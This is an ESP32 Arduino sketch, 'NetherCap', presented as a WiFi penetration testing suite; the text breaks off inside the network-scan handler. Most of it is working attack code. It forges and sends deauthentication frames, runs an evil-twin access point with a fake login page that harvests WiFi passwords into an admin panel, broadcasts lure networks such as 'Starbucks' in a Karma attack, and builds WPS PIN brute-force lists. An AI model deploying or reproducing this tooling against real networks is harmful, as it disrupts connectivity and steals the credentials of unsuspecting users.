#include <WiFi.h>
#include <WebServer.h>
#include <ESPmDNS.h>
#include <esp_wifi.h>
#include <vector>
#include <ArduinoJson.h>
#include <SD.h>
#include <SPI.h>
#include "time.h"
#include <HTTPClient.h>

// =================== KONFIGURASI ===================
#define VERSION "4.0"
#define LED_PIN 2
#define BUTTON_PIN 0
#define SD_CS 5
#define MAX_CLIENTS 8
#define MAX_PASSWORDS 100
#define WPS_TIMEOUT 120000  // 2 menit
#define DEAUTH_INTERVAL 100
#define SCAN_INTERVAL 10000

// =================== DEKLARASI ===================
WebServer server(80);

// Struktur data
typedef struct {
  uint8_t frame_control[2];
  uint8_t duration[2];
  uint8_t receiver[6];
  uint8_t transmitter[6];
  uint8_t bssid[6];
  uint8_t fragment[2];
  uint8_t reason_code[2];
} __attribute__((packed)) deauth_frame_t;

struct WiFiNetwork {
  String ssid;
  String bssid;
  int rssi;
  int channel;
  bool encrypted;
  bool wpsEnabled;
  time_t lastSeen;
};

struct CaptiveClient {
  String mac;
  String ssid;
  String password;
  time_t timestamp;
  bool connected;
};

struct WPSPin {
  String bssid;
  String pin;
  bool tried;
  bool success;
};

// Mode operasi
enum Mode { 
  IDLE, SCANNING, DEAUTH, EVIL_TWIN, KARMA_ATTACK,
  WARD_DRIVING, WPS_ATTACK, CAPTIVE_PORTAL 
};
Mode currentMode = IDLE;

// Data global
std::vector<WiFiNetwork> networks;
std::vector<CaptiveClient> captiveClients;
std::vector<WPSPin> wpsPins;
String targetSSID = "";
String targetBSSID = "";
int targetChannel = 1;
bool isAttacking = false;
unsigned long attackStart = 0;
int deauthCounter = 0;
int karmaCounter = 0;
int wpsAttempts = 0;

// Credential storage
String credentials[MAX_PASSWORDS];
int credentialCount = 0;

// =================== WPS PIN GENERATOR ===================
class WPSGenerator {
private:
  const char* DEFAULT_PINS[10] = {
    "12345678", "00000000", "11111111", "22222222", "33333333",
    "44444444", "55555555", "66666666", "77777777", "88888888"
  };
  
  const char* COMMON_PINS[50] = {
    "01234567", "12345670", "12345679", "12345689", "12345789",
    "12346789", "12356789", "12456789", "13456789", "23456789",
    "87654321", "76543210", "11111112", "11111113", "11111114",
    "22222221", "22222223", "33333332", "33333334", "44444443",
    "44444445", "55555554", "55555556", "66666665", "66666667",
    "77777776", "77777778", "88888887", "88888889", "99999999",
    "00000001", "00000002", "00000003", "00000004", "00000005",
    "11223344", "22334455", "33445566", "44556677", "55667788",
    "66778899", "99887766", "88776655", "77665544", "66554433",
    "12341234", "43214321", "12121212", "21212121", "12344321"
  };

public:
  void generatePins(String bssid) {
    // Clear existing pins for this BSSID
    for(int i = wpsPins.size()-1; i >= 0; i--) {
      if(wpsPins[i].bssid == bssid) {
        wpsPins.erase(wpsPins.begin() + i);
      }
    }
    
    // Add default pins
    for(int i = 0; i < 10; i++) {
      WPSPin pin;
      pin.bssid = bssid;
      pin.pin = DEFAULT_PINS[i];
      pin.tried = false;
      pin.success = false;
      wpsPins.push_back(pin);
    }
    
    // Add common pins
    for(int i = 0; i < 50; i++) {
      WPSPin pin;
      pin.bssid = bssid;
      pin.pin = COMMON_PINS[i];
      pin.tried = false;
      pin.success = false;
      wpsPins.push_back(pin);
    }
    
    // Generate pins from BSSID (last 4 digits)
    String bssidDigits = "";
    for(int i = 0; i < bssid.length(); i++) {
      if(isDigit(bssid[i])) {
        bssidDigits += bssid[i];
        if(bssidDigits.length() >= 4) break;
      }
    }
    
    if(bssidDigits.length() >= 4) {
      // Variations based on BSSID
      for(int i = 0; i < 10; i++) {
        WPSPin pin;
        pin.bssid = bssid;
        pin.pin = bssidDigits + String(i).substring(0, 8-bssidDigits.length());
        pin.tried = false;
        pin.success = false;
        wpsPins.push_back(pin);
      }
    }
    
    Serial.println("[+] Generated " + String(wpsPins.size()) + " WPS pins for " + bssid);
  }
  
  String getNextPin(String bssid) {
    for(auto& pin : wpsPins) {
      if(pin.bssid == bssid && !pin.tried) {
        pin.tried = true;
        wpsAttempts++;
        return pin.pin;
      }
    }
    return "";
  }
  
  void markSuccess(String bssid, String pin) {
    for(auto& p : wpsPins) {
      if(p.bssid == bssid && p.pin == pin) {
        p.success = true;
        break;
      }
    }
  }
};

WPSGenerator wpsGenerator;

// =================== WARDRIVING ===================
class Wardriving {
private:
  File logFile;
  unsigned long lastLogTime = 0;
  
public:
  void start() {
    if(!SD.begin(SD_CS)) {
      Serial.println("[-] SD card initialization failed!");
      return;
    }
    
    logFile = SD.open("/wardrive.log", FILE_WRITE);
    if(!logFile) {
      Serial.println("[-] Failed to open log file");
      return;
    }
    
    // Write header
    logFile.println("Timestamp,SSID,BSSID,RSSI,Channel,Encrypted,WPS,Latitude,Longitude");
    logFile.flush();
    
    Serial.println("[+] Wardriving started - Logging to SD card");
  }
  
  void stop() {
    if(logFile) {
      logFile.close();
    }
    Serial.println("[+] Wardriving stopped");
  }
  
  void logNetwork(WiFiNetwork network, float lat = 0.0, float lon = 0.0) {
    if(millis() - lastLogTime < 5000) return; // Log setiap 5 detik
    
    if(logFile) {
      String timestamp = getTimestamp();
      String line = timestamp + ",";
      line += network.ssid + ",";
      line += network.bssid + ",";
      line += String(network.rssi) + ",";
      line += String(network.channel) + ",";
      line += (network.encrypted ? "WPA2" : "OPEN") + ",";
      line += (network.wpsEnabled ? "YES" : "NO") + ",";
      line += String(lat, 6) + ",";
      line += String(lon, 6);
      
      logFile.println(line);
      logFile.flush();
      
      lastLogTime = millis();
    }
  }
  
  String getLogs() {
    if(!SD.begin(SD_CS)) return "SD card not available";
    
    File file = SD.open("/wardrive.log");
    if(!file) return "No log file found";
    
    String content = "";
    while(file.available()) {
      content += (char)file.read();
    }
    file.close();
    
    return content;
  }
};

Wardriving wardriver;

// =================== KARMA ATTACK ===================
class KarmaAttack {
private:
  std::vector<String> popularSSIDs = {
    "Free WiFi", "Public WiFi", "Airport WiFi", "Hotel WiFi",
    "Starbucks", "McDonald's Free WiFi", "Guest", "Open Network",
    "Cafe WiFi", "Shopping Mall", "Train WiFi", "Bus WiFi",
    "Library", "University", "Coffee Shop", "Restaurant",
    "Free Internet", "No Password", "Open WiFi", "Free Access"
  };
  
  int currentSSID = 0;
  unsigned long lastChange = 0;
  
public:
  void start() {
    Serial.println("[+] Karma Attack started");
    Serial.println("[+] Broadcasting popular SSIDs to attract clients");
    
    // Start with first SSID
    broadcastSSID(popularSSIDs[currentSSID]);
    lastChange = millis();
  }
  
  void stop() {
    WiFi.softAPdisconnect(true);
    Serial.println("[+] Karma Attack stopped");
  }
  
  void update() {
    // Change SSID every 30 seconds
    if(millis() - lastChange > 30000) {
      currentSSID = (currentSSID + 1) % popularSSIDs.size();
      broadcastSSID(popularSSIDs[currentSSID]);
      lastChange = millis();
      karmaCounter++;
      
      Serial.println("[Karma] Now broadcasting: " + popularSSIDs[currentSSID]);
    }
    
    // Log connected clients
    int clients = WiFi.softAPgetStationNum();
    if(clients > 0) {
      Serial.println("[Karma] " + String(clients) + " clients connected");
    }
  }
  
private:
  void broadcastSSID(String ssid) {
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.softAP(ssid.c_str(), NULL, 6, 0, MAX_CLIENTS);
  }
};

KarmaAttack karma;

// =================== DEAUTH ATTACK ===================
class DeauthAttack {
private:
  deauth_frame_t deauthFrame;
  bool isRunning = false;
  
public:
  void start(String bssid, int channel) {
    if(isRunning) return;
    
    // Set WiFi channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Parse MAC address
    uint8_t mac[6];
    sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    
    // Build deauth frame
    memset(&deauthFrame, 0, sizeof(deauthFrame));
    deauthFrame.frame_control[0] = 0xC0; // Deauth
    deauthFrame.frame_control[1] = 0x00;
    
    // Broadcast address
    uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(deauthFrame.receiver, broadcast, 6);
    memcpy(deauthFrame.transmitter, mac, 6);
    memcpy(deauthFrame.bssid, mac, 6);
    
    deauthFrame.reason_code[0] = 0x07; // Class 3 frame
    
    isRunning = true;
    Serial.println("[+] Deauth attack started on " + bssid);
  }
  
  void stop() {
    isRunning = false;
    Serial.println("[+] Deauth attack stopped");
  }
  
  void sendFrame() {
    if(!isRunning) return;
    
    esp_err_t result = esp_wifi_80211_tx(
      WIFI_IF_AP, 
      &deauthFrame, 
      sizeof(deauthFrame), 
      false
    );
    
    if(result == ESP_OK) {
      deauthCounter++;
      digitalWrite(LED_PIN, !digitalRead(LED_PIN));
    }
  }
  
  bool isActive() {
    return isRunning;
  }
};

DeauthAttack deauth;

// =================== ENHANCED CAPTIVE PORTAL ===================
class EnhancedCaptive {
private:
  String currentSSID;
  int loginCount = 0;
  
public:
  void start(String ssid, int channel) {
    currentSSID = ssid;
    
    // Stop current AP
    WiFi.softAPdisconnect(true);
    delay(100);
    
    // Start evil twin AP
    WiFi.softAP(ssid.c_str(), NULL, channel, 0, MAX_CLIENTS);
    
    Serial.println("[+] Evil Twin started: " + ssid);
    Serial.println("[+] Enhanced Captive Portal ready");
    
    // Setup web server routes
    setupRoutes();
  }
  
  void stop() {
    WiFi.softAPdisconnect(true);
    Serial.println("[+] Evil Twin stopped");
  }
  
  void setupRoutes() {
    // Login page
    server.on("/", HTTP_GET, []() {
      String page = R"rawliteral(
      <!DOCTYPE html>
      <html>
      <head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>WiFi Authentication Required</title>
        <style>
          * { margin: 0; padding: 0; box-sizing: border-box; }
          body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
          }
          .login-container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
          }
          .logo {
            text-align: center;
            margin-bottom: 30px;
          }
          .logo h1 {
            font-size: 2em;
            color: #00ff9d;
            margin-bottom: 10px;
          }
          .network-info {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            text-align: center;
          }
          .network-info .ssid {
            font-weight: bold;
            font-size: 1.2em;
            color: #00ff9d;
          }
          .form-group {
            margin-bottom: 20px;
          }
          .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
          }
          .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
            border: 1px solid rgba(255, 255, 255, 0.2);
          }
          .form-group input:focus {
            outline: none;
            border-color: #00ff9d;
          }
          .submit-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(45deg, #00ff9d, #00b894);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
          }
          .submit-btn:hover {
            transform: translateY(-2px);
          }
          .submit-btn:disabled {
            background: #666;
            cursor: not-allowed;
          }
          .message {
            margin-top: 15px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            font-size: 0.9em;
            display: none;
          }
          .success {
            background: rgba(0, 255, 157, 0.2);
            border: 1px solid rgba(0, 255, 157, 0.5);
          }
          .error {
            background: rgba(255, 65, 108, 0.2);
            border: 1px solid rgba(255, 65, 108, 0.5);
          }
          .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 0.8em;
            color: rgba(255, 255, 255, 0.6);
          }
        </style>
      </head>
      <body>
        <div class="login-container">
          <div class="logo">
            <h1>üîí WiFi Login</h1>
            <p>Secure Authentication Required</p>
          </div>
          
          <div class="network-info">
            <div class="ssid">)rawliteral";
      page += targetSSID;
      page += R"rawliteral(</div>
            <div style="margin-top:5px;font-size:0.9em;">
              Please enter password to connect
            </div>
          </div>
          
          <form id="loginForm">
            <div class="form-group">
              <label for="password">WiFi Password:</label>
              <input type="password" id="password" placeholder="Enter network password" required>
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">
              Connect to Internet
            </button>
          </form>
          
          <div id="message" class="message"></div>
          
          <div class="footer">
            <p>¬© 2024 Network Security System</p>
            <p style="margin-top:5px;">Authentication required for internet access</p>
          </div>
        </div>
        
        <script>
          document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const password = document.getElementById('password').value;
            const submitBtn = document.getElementById('submitBtn');
            const message = document.getElementById('message');
            
            // Disable button and show loading
            submitBtn.disabled = true;
            submitBtn.innerHTML = 'Verifying...';
            message.style.display = 'none';
            
            try {
              const response = await fetch('/auth', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'password=' + encodeURIComponent(password)
              });
              
              const result = await response.text();
              
              if(response.ok) {
                // Success
                message.className = 'message success';
                message.innerHTML = '‚úì Authentication successful! Connecting...';
                message.style.display = 'block';
                
                // Change button to success
                submitBtn.innerHTML = '‚úì Connected';
                submitBtn.style.background = 'linear-gradient(45deg, #00b894, #00a085)';
                
                // Redirect to "internet" after delay
                setTimeout(() => {
                  window.location.href = 'http://www.google.com';
                }, 2000);
              } else {
                // Error
                message.className = 'message error';
                message.innerHTML = '‚úó ' + result;
                message.style.display = 'block';
                
                // Re-enable button
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Try Again';
              }
            } catch(error) {
              message.className = 'message error';
              message.innerHTML = '‚úó Connection error. Please try again.';
              message.style.display = 'block';
              
              submitBtn.disabled = false;
              submitBtn.innerHTML = 'Try Again';
            }
          });
          
          // Optional: Show password toggle
          document.getElementById('password').addEventListener('input', function(e) {
            if(e.target.value.length > 0) {
              document.getElementById('submitBtn').disabled = false;
            }
          });
        </script>
      </body>
      </html>
      )rawliteral";
      
      server.send(200, "text/html", page);
    });
    
    // Authentication endpoint
    server.on("/auth", HTTP_POST, []() {
      String password = server.arg("password");
      
      if(password.length() == 0) {
        server.send(400, "text/plain", "Password cannot be empty");
        return;
      }
      
      // Save credential
      saveCredential(targetSSID, targetBSSID, password);
      
      // Log client info
      CaptiveClient client;
      client.mac = server.client().remoteIP().toString();
      client.ssid = targetSSID;
      client.password = password;
      client.timestamp = time(nullptr);
      client.connected = true;
      captiveClients.push_back(client);
      
      Serial.println("\n[!] LOGIN CAPTURED!");
      Serial.println("    Client IP: " + client.mac);
      Serial.println("    SSID: " + targetSSID);
      Serial.println("    Password: " + password);
      Serial.println("    Time: " + String(client.timestamp));
      
      server.send(200, "text/plain", "Authentication successful");
    });
    
    // Admin page to view captured credentials
    server.on("/admin", HTTP_GET, []() {
      if(server.hasArg("key") && server.arg("key") == "nether123") {
        String adminPage = R"rawliteral(
        <!DOCTYPE html>
        <html>
        <head>
          <title>NetherCap Admin</title>
          <style>
            body { font-family: Arial; padding: 20px; background: #f0f0f0; }
            .container { max-width: 1000px; margin: 0 auto; }
            h1 { color: #333; }
            .stats { background: white; padding: 20px; border-radius: 10px; margin: 20px 0; }
            table { width: 100%; border-collapse: collapse; background: white; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
            th { background: #667eea; color: white; }
            tr:hover { background: #f5f5f5; }
            .logout { float: right; }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>üîê NetherCap Admin Panel <span class="logout"><a href="/">Logout</a></span></h1>
            
            <div class="stats">
              <h3>üìä Statistics</h3>
              <p>Total Logins Captured: )rawliteral";
        adminPage += String(captiveClients.size());
        adminPage += R"rawliteral(</p>
              <p>Current SSID: )rawliteral";
        adminPage += targetSSID;
        adminPage += R"rawliteral(</p>
              <p>Connected Clients: )rawliteral";
        adminPage += String(WiFi.softAPgetStationNum());
        adminPage += R"rawliteral(</p>
            </div>
            
            <h3>üìù Captured Credentials</h3>
            <table>
              <tr>
                <th>Time</th>
                <th>Client IP</th>
                <th>SSID</th>
                <th>Password</th>
                <th>Status</th>
              </tr>
        )rawliteral";
        
        for(const auto& client : captiveClients) {
          adminPage += "<tr>";
          adminPage += "<td>" + String(client.timestamp) + "</td>";
          adminPage += "<td>" + client.mac + "</td>";
          adminPage += "<td>" + client.ssid + "</td>";
          adminPage += "<td>" + client.password + "</td>";
          adminPage += "<td>" + (client.connected ? "Connected" : "Disconnected") + "</td>";
          adminPage += "</tr>";
        }
        
        adminPage += R"rawliteral(
            </table>
            
            <div style="margin-top:30px;">
              <h3>‚ö° Quick Actions</h3>
              <button onclick="location.href='/admin?key=nether123&action=export'">Export as CSV</button>
              <button onclick="location.href='/admin?key=nether123&action=clear'">Clear All Logs</button>
              <button onclick="location.href='/admin?key=nether123&action=stop'">Stop Attack</button>
            </div>
          </div>
        </body>
        </html>
        )rawliteral";
        
        server.send(200, "text/html", adminPage);
      } else {
        server.send(401, "text/plain", "Unauthorized");
      }
    });
    
    // Redirect all other requests to login page
    server.onNotFound([]() {
      String redirectUrl = "http://" + WiFi.softAPIP().toString() + "/";
      server.sendHeader("Location", redirectUrl);
      server.send(302, "text/plain", "");
    });
  }
};

EnhancedCaptive captive;

// =================== SETUP ===================
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n\n========================================");
  Serial.println("      NETHERCAP ESP32 v" VERSION);
  Serial.println("========================================");
  Serial.println("Features: Deauth, Evil Twin, Karma Attack");
  Serial.println("          WPS Brute Force, Wardriving");
  Serial.println("========================================");
  
  // Initialize hardware
  pinMode(LED_PIN, OUTPUT);
  pinMode(BUTTON_PIN, INPUT_PULLUP);
  
  // Initialize SD card for wardriving
  if(SD.begin(SD_CS)) {
    Serial.println("[+] SD card initialized for wardriving");
  }
  
  // Initialize WiFi
  initWiFi();
  
  // Initialize web server
  initWebServer();
  
  // Initialize mDNS
  if(MDNS.begin("nethercap")) {
    MDNS.addService("http", "tcp", 80);
    Serial.println("[+] mDNS: http://nethercap.local");
  }
  
  // Startup sequence
  startupSequence();
  
  Serial.println("\n[+] SYSTEM READY!");
  Serial.println("[+] AP: NetherCap_" + WiFi.macAddress().substring(9));
  Serial.println("[+] Pass: nether123");
  Serial.println("[+] URL: http://" + WiFi.softAPIP().toString());
  Serial.println("[+] Admin: http://" + WiFi.softAPIP().toString() + "/admin?key=nether123");
}

void initWiFi() {
  WiFi.mode(WIFI_AP_STA);
  
  // Create unique AP name
  String mac = WiFi.macAddress();
  mac.replace(":", "");
  String apName = "NetherCap_" + mac.substring(9);
  
  // Configure AP
  WiFi.softAPConfig(
    IPAddress(192, 168, 4, 1),
    IPAddress(192, 168, 4, 1),
    IPAddress(255, 255, 255, 0)
  );
  
  // Start AP
  WiFi.softAP(apName.c_str(), "nether123", 1, 0, MAX_CLIENTS);
  
  // Set max TX power
  esp_wifi_set_max_tx_power(84);
  
  Serial.println("[+] AP Started: " + apName);
  Serial.println("[+] AP IP: " + WiFi.softAPIP().toString());
}

void initWebServer() {
  // Main control panel
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/networks", HTTP_GET, handleNetworks);
  server.on("/attack", HTTP_POST, handleAttack);
  server.on("/stop", HTTP_POST, handleStop);
  server.on("/status", HTTP_GET, handleStatus);
  server.on("/logs", HTTP_GET, handleLogs);
  server.on("/wardrive", HTTP_POST, handleWardrive);
  server.on("/wps", HTTP_POST, handleWPSAttack);
  server.on("/karma", HTTP_POST, handleKarma);
  
  server.begin();
  Serial.println("[+] Web server started on port 80");
}

void startupSequence() {
  for(int i = 0; i < 5; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(100);
    digitalWrite(LED_PIN, LOW);
    delay(100);
  }
}

// =================== WEB HANDLERS ===================
void handleRoot() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NetherCap v)rawliteral";
  html += VERSION;
  html += R"rawliteral(</title>
    <style>
      :root {
        --primary: #667eea;
        --secondary: #764ba2;
        --danger: #ff416c;
        --success: #00ff9d;
        --warning: #ffa500;
        --dark: #1a1a2e;
      }
      
      * { margin: 0; padding: 0; box-sizing: border-box; }
      
      body {
        font-family: 'Segoe UI', system-ui;
        background: linear-gradient(135deg, var(--dark), #0f0c29);
        color: white;
        min-height: 100vh;
        padding: 20px;
      }
      
      .container {
        max-width: 1200px;
        margin: 0 auto;
      }
      
      header {
        text-align: center;
        padding: 30px 0;
        border-bottom: 2px solid rgba(255,255,255,0.1);
        margin-bottom: 30px;
      }
      
      h1 {
        color: var(--success);
        font-size: 2.5em;
        margin-bottom: 10px;
        text-shadow: 0 0 10px rgba(0,255,157,0.3);
      }
      
      .dashboard {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
        gap: 20px;
        margin-bottom: 30px;
      }
      
      .card {
        background: rgba(255, 255, 255, 0.05);
        backdrop-filter: blur(10px);
        border-radius: 15px;
        padding: 25px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        transition: transform 0.3s;
      }
      
      .card:hover {
        transform: translateY(-5px);
        border-color: var(--success);
      }
      
      .card h2 {
        color: var(--success);
        margin-bottom: 20px;
        font-size: 1.4em;
        display: flex;
        align-items: center;
        gap: 10px;
      }
      
      button {
        background: linear-gradient(45deg, var(--primary), var(--secondary));
        color: white;
        border: none;
        padding: 12px 20px;
        border-radius: 8px;
        cursor: pointer;
        font-weight: bold;
        font-size: 1em;
        transition: all 0.3s;
        margin: 5px;
        width: 100%;
      }
      
      button:hover {
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
      }
      
      button.attack {
        background: linear-gradient(45deg, var(--danger), #ff4b2b);
      }
      
      button.success {
        background: linear-gradient(45deg, var(--success), #00b894);
      }
      
      button.warning {
        background: linear-gradient(45deg, var(--warning), #ff8c00);
      }
      
      .status {
        padding: 10px;
        border-radius: 8px;
        margin: 10px 0;
        font-weight: bold;
        text-align: center;
      }
      
      .status.idle {
        background: rgba(0, 255, 157, 0.2);
        border: 1px solid rgba(0, 255, 157, 0.5);
      }
      
      .status.attacking {
        background: rgba(255, 65, 108, 0.2);
        border: 1px solid rgba(255, 65, 108, 0.5);
        animation: pulse 1s infinite;
      }
      
      @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.7; }
      }
      
      #networkList {
        max-height: 300px;
        overflow-y: auto;
        margin: 15px 0;
        padding: 10px;
        background: rgba(0, 0, 0, 0.2);
        border-radius: 8px;
      }
      
      .network {
        padding: 12px;
        margin: 8px 0;
        background: rgba(255, 255, 255, 0.05);
        border-radius: 8px;
        cursor: pointer;
        transition: all 0.2s;
        border-left: 4px solid transparent;
      }
      
      .network:hover {
        background: rgba(255, 255, 255, 0.1);
        transform: translateX(5px);
      }
      
      .network.selected {
        background: rgba(0, 255, 157, 0.1);
        border-left-color: var(--success);
      }
      
      .info-row {
        display: flex;
        justify-content: space-between;
        margin: 10px 0;
        padding: 10px;
        background: rgba(255,255,255,0.05);
        border-radius: 5px;
      }
      
      .info-label {
        color: #aaa;
      }
      
      .info-value {
        color: #fff;
        font-weight: bold;
      }
      
      .modal {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.8);
        z-index: 1000;
        align-items: center;
        justify-content: center;
      }
      
      .modal-content {
        background: linear-gradient(135deg, #1a1a2e, #16213e);
        padding: 30px;
        border-radius: 15px;
        width: 90%;
        max-width: 800px;
        max-height: 80vh;
        overflow-y: auto;
        border: 2px solid var(--success);
      }
      
      @media (max-width: 768px) {
        .dashboard {
          grid-template-columns: 1fr;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <header>
        <h1>‚ö° NETHERCAP ESP32</h1>
        <div style="color:#aaa;margin-top:10px;">Complete WiFi Penetration Testing Suite</div>
      </header>
      
      <div class="dashboard">
        <!-- Scanner Panel -->
        <div class="card">
          <h2>üì° Network Scanner</h2>
          <button onclick="scanNetworks()" class="success">Start Scanning</button>
          <div id="networkList">
            Click "Start Scanning" to discover networks
          </div>
          <div class="info-row">
            <span class="info-label">Selected Target:</span>
            <span class="info-value" id="targetName">None</span>
          </div>
        </div>
        
        <!-- Attack Panel -->
        <div class="card">
          <h2>‚öîÔ∏è Attack Controls</h2>
          <button onclick="startAttack('deauth')" class="attack">Deauth Attack</button>
          <button onclick="startAttack('eviltwin')" class="attack">Evil Twin</button>
          <button onclick="startAttack('karma')" class="warning">Karma Attack</button>
          <button onclick="startAttack('wps')" class="warning">WPS Brute Force</button>
          <button onclick="stopAttack()" class="" id="stopBtn" disabled>Stop All</button>
          <div class="status idle" id="statusDisplay">Status: IDLE</div>
        </div>
        
        <!-- Status Panel -->
        <div class="card">
          <h2>üìä System Status</h2>
          <div class="info-row">
            <span class="info-label">Connected Clients:</span>
            <span class="info-value" id="clientCount">0</span>
          </div>
          <div class="info-row">
            <span class="info-label">Deauth Packets:</span>
            <span class="info-value" id="deauthCount">0</span>
          </div>
          <div class="info-row">
            <span class="info-label">Logins Captured:</span>
            <span class="info-value" id="loginCount">0</span>
          </div>
          <div class="info-row">
            <span class="info-label">WPS Attempts:</span>
            <span class="info-value" id="wpsCount">0</span>
          </div>
          <button onclick="showLogs()" class="success">View Captured Data</button>
          <button onclick="location.href='/admin?key=nether123'" class="" style="margin-top:10px;">Admin Panel</button>
        </div>
      </div>
      
      <!-- Wardriving Panel -->
      <div class="card" style="margin-top:20px;">
        <h2>üó∫Ô∏è Wardriving</h2>
        <button onclick="startWardrive()" class="success">Start Wardriving</button>
        <button onclick="stopWardrive()" class="">Stop Wardriving</button>
        <div style="margin-top:15px;color:#aaa;font-size:0.9em;">
          Logs WiFi networks to SD card with GPS coordinates
        </div>
      </div>
    </div>
    
    <!-- Logs Modal -->
    <div id="logsModal" class="modal">
      <div class="modal-content">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
          <h2 style="color:#00ff9d;">üìú Captured Data</h2>
          <span onclick="closeModal()" style="color:#fff;font-size:28px;cursor:pointer;padding:0 10px;">&times;</span>
        </div>
        <div id="logsContent">
          Loading...
        </div>
      </div>
    </div>
    
    <script>
      let selectedNetwork = null;
      
      function scanNetworks() {
        document.getElementById('networkList').innerHTML = '<div style="text-align:center;padding:20px;">Scanning...</div>';
        
        fetch('/scan')
          .then(r => r.json())
          .then(data => {
            const list = document.getElementById('networkList');
            list.innerHTML = '';
            
            data.networks.forEach(network => {
              const div = document.createElement('div');
              div.className = 'network';
              div.onclick = () => selectNetwork(network);
              
              div.innerHTML = `
                <strong>${network.ssid || '[Hidden]'}</strong>
                <div style="font-size:0.9em;color:#aaa;margin-top:5px;">
                  ${network.bssid} | Ch ${network.channel} | ${network.rssi}dBm
                  ${network.wps ? ' | WPS: ‚úì' : ''}
                </div>
              `;
              
              list.appendChild(div);
            });
            
            updateStatus();
          });
      }
      
      function selectNetwork(network) {
        selectedNetwork = network;
        
        document.querySelectorAll('.network').forEach(item => {
          item.classList.remove('selected');
        });
        event.currentTarget.classList.add('selected');
        
        document.getElementById('targetName').textContent = network.ssid;
        
        // Send to server
        fetch('/attack', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            action: 'select',
            network: network
          })
        });
      }
      
      function startAttack(type) {
        if(!selectedNetwork && type !== 'karma') {
          alert('Please select a network first!');
          return;
        }
        
        fetch('/attack', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            action: type,
            network: selectedNetwork
          })
        })
        .then(r => r.text())
        .then(result => {
          alert(result);
          updateStatus();
        });
      }
      
      function stopAttack() {
        fetch('/stop', {
          method: 'POST'
        })
        .then(r => r.text())
        .then(result => {
          alert(result);
          updateStatus();
        });
      }
      
      function startWardrive() {
        fetch('/wardrive', {
          method: 'POST',
          body: JSON.stringify({action: 'start'})
        })
        .then(r => r.text())
        .then(result => alert(result));
      }
      
      function stopWardrive() {
        fetch('/wardrive', {
          method: 'POST',
          body: JSON.stringify({action: 'stop'})
        })
        .then(r => r.text())
        .then(result => alert(result));
      }
      
      function showLogs() {
        fetch('/logs')
          .then(r => r.text())
          .then(html => {
            document.getElementById('logsContent').innerHTML = html;
            document.getElementById('logsModal').style.display = 'flex';
          });
      }
      
      function closeModal() {
        document.getElementById('logsModal').style.display = 'none';
      }
      
      function updateStatus() {
        fetch('/status')
          .then(r => r.json())
          .then(data => {
            document.getElementById('clientCount').textContent = data.clients;
            document.getElementById('deauthCount').textContent = data.deauthCount;
            document.getElementById('loginCount').textContent = data.loginCount;
            document.getElementById('wpsCount').textContent = data.wpsAttempts;
            
            const status = document.getElementById('statusDisplay');
            status.className = 'status ' + data.mode;
            status.textContent = 'Status: ' + data.mode.toUpperCase();
            
            const stopBtn = document.getElementById('stopBtn');
            stopBtn.disabled = data.mode === 'idle';
          });
      }
      
      // Auto-update status
      setInterval(updateStatus, 2000);
      updateStatus();
      
      // Close modal on outside click
      window.onclick = function(event) {
        if(event.target.id === 'logsModal') {
          closeModal();
        }
      };
    </script>
  </body>
  </html>
  )rawliteral";
  
  server.send(200, "text/html", html);
}

void handleScan() {
  // Scan networks
  int n = WiFi.scanNetworks(false, true);
  
  StaticJsonDocument<4096> doc;
  JsonArray networksArray = doc.createNestedArray("networks");
  
  for(int i = 0; i < n && i < 30; i++) {
    JsonObject net = networksArray.createNestedObject();
    net["ssid"] = WiFi.SSID(i);
    net["bssid"] = WiFi.BSSIDstr(i);
    net["rssi"] = WiFi.RSSI(i);
